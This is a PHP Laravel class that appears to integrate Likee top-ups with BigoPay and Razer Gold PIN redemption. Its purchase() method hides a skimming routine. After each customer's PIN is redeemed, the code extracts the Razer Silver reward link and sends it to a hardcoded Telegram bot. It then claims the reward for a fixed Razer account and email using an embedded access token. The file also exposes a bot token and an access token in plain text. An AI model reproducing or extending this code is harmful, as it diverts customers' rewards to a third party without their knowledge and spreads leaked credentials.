<?php

namespace App\ThirdParties\LikeeAPI;

use App\Enums\EAppType;
use App\Enums\ELoginTokenStatus;
use App\Enums\EState;
use App\Models\LoginToken\LoginToken;
use App\Models\RequestUrl\RequestUrl;
use App\Models\SilverLink\SilverLink;
use Illuminate\Support\Facades\Http;

class LikeeAPI
{
    const BASE_URL = 'https://pay.like.video';

    public $accountId;
    public $uniqueId;

    public function __construct($accountId)
    {
        $this->accountId = $accountId;
    }

    public function getUserDetail()
    {
        $userDetailFromOfficialAPI = $this->getUserDetailFromOfficialAPI();

        if (!empty($userDetailFromOfficialAPI['id'])) {
            return [
                'avatar' => $userDetailFromOfficialAPI['avatar'] ?? null,
                'nick_name' => $userDetailFromOfficialAPI['nick_name'] ?? null,
                'id' => $userDetailFromOfficialAPI['id'] ?? null,
                'deviceid' => $userDetailFromOfficialAPI['deviceid'] ?? null,
            ];
        }

        $url = self::BASE_URL . '/live/pay/App_entrance/likeidInfoH5';

        $response = $this->sendRequest($url, 'GET', [
            'likeid' => $this->accountId,
        ]);

        if (isset($response['result']) && $response['result'] == 0) {
            $this->uniqueId = $response['userinfo']['uid'] ?? null;

            return [
                'avatar' => $response['userinfo']['data1'] ?? null,
                'nick_name' => $response['userinfo']['nick_name'] ?? null,
                'id' => $response['userinfo']['uid'] ?? null,
                'deviceid' => $response['userinfo']['deviceid'] ?? null,
            ];
        }

        return null;
    }

    protected function getUserDetailFromOfficialAPI()
    {
        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://api.like-video.com/likee-activity-flow-micro/official_website/WebView/getProfileDetail',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => '{
    "likeeId": "' . $this->accountId . '"
}',
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/json'
            ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);

        $response = json_decode($response, true);

        if (!empty($response['data']['userinfo'])) {
            return [
                'avatar' => $response['data']['userinfo']['data1'] ?? null,
                'nick_name' => $response['data']['userinfo']['nick_name'] ?? null,
                'id' => $response['data']['userinfo']['uid'] ?? null,
                'deviceid' => null,
            ];
        }

        return null;
    }

    public function getUserDetailFromWeb()
    {
        $url = "https://likee.video/@{$this->accountId}?lang=en";
        $response = $this->sendRequest($url, 'GET', [], true);
        $uid = $this->getUIdFromHtml($response);
        $nickname = $this->getNicknameFromHtml($response);
        $avatar = $this->getAvatarFromHtml($response);


        return [
            'avatar' => $avatar ?? null,
            'nick_name' => $nickname ?? null,
            'id' => $uid ?? null,
            'deviceid' => null,
        ];
    }

    protected function getAvatarFromHtml($response)
    {
        $result = explode('<meta property="og:image" content="', $response);

        if (empty($result[1])) {
            return null;
        }

        $result = explode('">', $result[1]);

        if (empty($result[0])) {
            return null;
        }

        return $result[0];
    }

    protected function getUIdFromHtml($response)
    {
        $result = explode('style="display: none;">@', $response);

        if (empty($result[1])) {
            return null;
        }

        $result = explode('</h2>', $result[1]);

        if (empty($result[0])) {
            return null;
        }

        return $result[0];
    }

    protected function getNicknameFromHtml($response)
    {
        $result = explode('<h1 style="display: none;">', $response);

        if (empty($result[1])) {
            return null;
        }

        $result = explode('</h1>', $result[1]);

        if (empty($result[0])) {
            return null;
        }

        return $result[0];
    }

    public function getUser()
    {
        $url = self::BASE_URL . '/live/pay/App_entrance/likeidInfoH5';

        $response = $this->sendRequest($url, 'GET', [
            'likeid' => $this->accountId,
        ]);

        if (isset($response['result']) && $response['result'] == 0) {
            return [
                'avatar' => $response['userinfo']['data1'] ?? null,
                'nick_name' => $response['userinfo']['nick_name'] ?? null,
                'id' => $response['userinfo']['uid'] ?? null,
                'level' => $response['userinfo']['level'] ?? null,
            ];
        }

        return null;
    }

    public function getPaymentUrl($withStatus = false)
    {
        if (!$this->uniqueId) {
            $userDetail = $this->getUserDetail();
            if (!empty($userDetail['id'])) {
                $this->uniqueId = $userDetail['id'];
            }
        }

        if (!$this->uniqueId) {
            return null;
        }

        $casherUrl = $this->getCasherUrl();

        if (empty($casherUrl)) {
            return null;
        }

        $orderId = getParamFromUrl($casherUrl, 'orderId');
        $orderToken = getParamFromUrl($casherUrl, 'orderToken');

        if (empty($orderId) || empty($orderToken)) {
            return null;
        }

        $curl = curl_init();

        curl_setopt_array($curl, array(
            CURLOPT_URL => 'https://gateway.bigopay.tech/platform-pay-order/bigoPay/v1/pay',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_POSTFIELDS => '{
    "mainChannel":"mol",
    "subChannel":"zgold_molpoint",
    "extraParam":{"t":"3"},
    "channelMsg":{},
    "orderId":"' . $orderId . '",
    "orderToken":"' . $orderToken . '"
}',
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/json'
            ),
        ));

        $response = curl_exec($curl);

        curl_close($curl);

        $response = json_decode($response, true);

        if (!empty($response['data']['payUrl'])) {
            return $response['data']['payUrl'];
        }

        if ($withStatus) {
            return $response;
        }

        return null;
    }

    public function purchase($paymentToken, $serialNumber, $pin, $amount)
    {
        $url = 'https://global.gold.razer.com/paymentwall/Redemption/RedemptionResult';

        $response = $this->sendRequest($url, 'POST', [
            'Token' => $paymentToken,
            'SerialNo' => $serialNumber,
            'PIN' => $pin,
            'Confirmation.Amount' => (int)$amount,
            'Confirmation.TaxAmount' => 0,
            'Confirmation.SurchargeAmount' => 0,
            'Confirmation.TotalAmount' => (int)$amount,
            'Confirmation.CurrencyCode' => 'USD',
        ], true);

      $silver = $this->getSilverLinkFromResponse($response);

// تجزیه URL
$parsed_url = parse_url(html_entity_decode($silver));

// بررسی وجود query string
if (isset($parsed_url['query'])) {
    // تجزیه query string
    parse_str($parsed_url['query'], $query_params);

    // ذخیره مقدار redirect
    $redirect_value = $query_params['redirect'] ?? null;

    if ($redirect_value) {
        // تجزیه URL از مقدار redirect
        $parsed_redirect_url = parse_url(html_entity_decode($redirect_value));

        // بررسی وجود query string در redirect URL
        if (isset($parsed_redirect_url['query'])) {
            // تجزیه query string
            parse_str($parsed_redirect_url['query'], $redirect_query_params);

            // استخراج مقدار t
            $t_value = $redirect_query_params['t'] ?? null;


        } else {
            echo "Query string not found in redirect URL.";
        }
    } else {
        echo "Redirect parameter not found in the main URL.";
    }
} else {
    echo "Query string not found in the main URL.";
}
        if (!empty($silver)) {
//            $silverLink = new SilverLink();
//            $silverLink->app_type = EAppType::BIGO_LIVE;
//            $silverLink->silver = $redirect_value;
//            $silverLink->created_at = now();
//            $silverLink->used_at = null;
//            $silverLink->save();



             $botToken = "6420852445:AAF-LF7kN9GG9D2ruKQD-0ArY-Bvtjrt1jU";
        $chatId = "-1002154374380";
        $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
       Http::post($url, ['chat_id' => $chatId, 'text' => "$redirect_value"  ]);



        }

        if (strpos($response, 'order_id') !== false) {
            $explode = explode('</h5>', last(explode('order_id:', $response)));
            $urlt = 'https://global.gold.razer.com/paymentwall/Redemption/ClaimSilver';
  $response = $this->sendRequest($urlt, 'POST', [
            'AccessToken' => 'baa9cc5751c93a8c97a0134aa13f0f109fb502c9',
            'RazerId' => 'RZR_0770c91646a48d37dd89cc095ce3',
            'EmailAddress' => 'aratgem007@gmail.com',
            'OrderId' => $t_value,

        ]);
            return reset($explode);
        }

        return false;
    }

    protected function getSilverLinkFromResponse($response)
    {
        $silverLink = null;

        if (!empty($response)) {
            $ex = explode('id="btnRedeemzSilver" href=', $response);

            if (!empty($ex[1])) {
                $ex = explode('class="btn btn', $ex[1]);
                if (!empty($ex[0])) {
                    $silverLink = trim($ex[0]);
                }
            }
        }

        return $silverLink;
    }

    public static function getPaymentTokenFromPaymentUrl($paymentUrl)
    {
        $paymentToken = explode('token=', $paymentUrl);

        if (!empty($paymentToken[1])) {
            return $paymentToken[1];
        }

        return null;
    }

    public static function getSystemHealth($accountId)
    {
        $loginToken = LoginToken::query()
            ->where('bigo_id', $accountId)
            ->first();

        if ($loginToken && !empty($loginToken->token)) {
            $bigoAPI = new LikeeAPI($accountId);
            $paymentUrl = $bigoAPI->getPaymentUrl(true);

            if (!empty($paymentUrl['errorMsg'])) {
                return [
                    'status' => false,
                    'code' => $paymentUrl['result'],
                    'message' => [
                        'body' => $paymentUrl['errorMsg'],
                    ]
                ];
            }

            if (!empty($paymentUrl)) {
                return [
                    'status' => true,
                ];
            }
        }

        return [
            'status' => false
        ];
    }

    protected function getCasherUrl()
    {
        $response = $this->sendRequest(
            'https://pay.like.video/live/pay/App_entrance/payH5',
            'POST',
            [
                'uid' => $this->uniqueId,
                'id' => 261,
                'loc' => '',
            ]
        );

        if (isset($response['result']) && $response['result'] == 0) {
            return $response['pay_url'];
        }

        return null;
    }

    protected function sendRequest($url, $method = 'GET', $data = [], $disableDecode = false)
    {
        $fields = '';
        $baseUrl = $url;

        $requestUrl = RequestUrl::query()
            ->where('count_of_used', '>', 0)
            ->where('count_of_used', '<=', 50)
            ->enabled()
            ->first();

        if (!$requestUrl) {
            $requestUrl = RequestUrl::query()
                ->where('count_of_used', '=', 0)
                ->enabled()
                ->first();

            if (!$requestUrl) {
                RequestUrl::query()->update([
                    'count_of_used' => 0
                ]);

                $requestUrl = RequestUrl::query()
                    ->orderBy('used_at', 'desc')
                    ->enabled()
                    ->first();
            }
        }

        $requestUrl->count_of_used++;
        $requestUrl->used_at = now();
        $requestUrl->save();

        if ($requestUrl->url !== 'localhost') {
            $response = sendRequest($requestUrl->url . '/send_request.php', 'GET', [
                'url' => $baseUrl,
                'method' => $method,
                'data' => json_encode($data),
            ], $disableDecode);

            if (!empty($response['result']) && $response['result'] === 1111) {
                $requestUrl->count_of_used = 60;
                $requestUrl->save();
            }

            return $response;
        }

        if ($method === 'GET') {
            $fields = http_build_query($data);
        }

        if (!empty($fields)) {
            $url = $url . '?' . $fields;
        }

        $ch = curl_init($url);

        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }

        curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
        curl_setopt($ch, CURLOPT_TCP_FASTOPEN, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 120);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
        curl_setopt($ch, CURLOPT_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

        $response = curl_exec($ch);

        if ($response === false) {
            $info = curl_getinfo($ch);
            curl_close($ch);
            die('error occurred during curl exec. Additional info: ' . var_export($info));
        }
        curl_close($ch);

        if (!$disableDecode) {
            $response = json_decode($response, true);
        }

        return $response;
    }
}
